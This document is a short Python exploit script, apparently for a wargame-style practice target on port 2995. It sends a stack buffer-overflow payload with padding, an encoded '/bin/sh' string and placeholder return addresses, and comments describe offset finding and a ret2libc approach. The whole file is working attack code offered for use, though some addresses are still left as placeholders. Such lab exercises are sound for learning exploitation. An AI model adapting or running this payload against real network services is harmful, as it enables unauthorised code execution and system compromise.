#!/usr/bin/python
import struct
import argparse
import sys
import os
import socket
socketObject = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socketObject.connect((sys.argv[1],2995))
print("Connected")
#resp=socketObject.recv(4)
#resp=""
#print "CLIENT: >",resp

buf=""
buf+="A"*503 # the original buffer size
buf+="\x68\x73\x2f\x6e\x69\x62\x2f"
buf+="\x00"
buf+="A"*10
#bin/sh encoded and reversed
buf+="\x68\x73\x2f\x6e\x69\x62\x2f"
#pattern string for overflow calculation, found to be 21
#buf+="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
#We are going to use the ret2libC technique here which has several benefits over vanilla exploit
buf+="A"*4 #padding
#Address to execve
#buf+="\x0c\x8c\x04\x08"
buf+="D"*4 #replace this with first instruction of execve
buf+="EEEE"# RET after execve , can be junk
buf+="FFFF" #needs to be the address of /bin/sh string on stack ->bffffc50
#\x2f\x62\x69\x6e\x2f\x73\x68
buf+="GGGG"
buf+="HHHH"
buf+="\n"
socketObject.send(buf)
resp=socketObject.recv(10)
print(resp)
